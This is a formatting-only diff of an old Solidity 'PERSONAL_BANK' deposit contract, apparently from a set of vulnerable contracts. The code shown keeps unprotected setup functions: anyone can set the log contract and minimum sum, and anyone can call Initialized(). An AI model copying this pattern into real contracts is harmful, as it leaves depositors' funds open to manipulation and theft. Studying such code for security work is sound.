@@ -16,37 +16,30 @@ contract PERSONAL_BANK
     
     bool intitalized;
     
-    function SetMinSum(uint _val)
-    public
+    function SetMinSum(uint _val) public
     {
         if(intitalized)revert();
         MinSum = _val;
     }
     
-    function SetLogFile(address _log)
-    public
+    function SetLogFile(address _log) public
     {
         if(intitalized)revert();
         Log = LogFile(_log);
     }
     
-    function Initialized()
-    public
+    function Initialized() public
     {
         intitalized = true;
     }
     
-    function Deposit()
-    public
-    payable
+    function Deposit() public payable
     {
         balances[msg.sender]+= msg.value;
         Log.AddMessage(msg.sender,msg.value,"Put");
     }
     
-    function Collect(uint _am)
-    public
-    payable
+    function Collect(uint _am) public payable
     {
         if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
         {
@@ -59,9 +52,7 @@ contract PERSONAL_BANK
         }
     }
     
-    function() 
-    public 
-    payable
+    function() public payable
     {
         Deposit();
     }
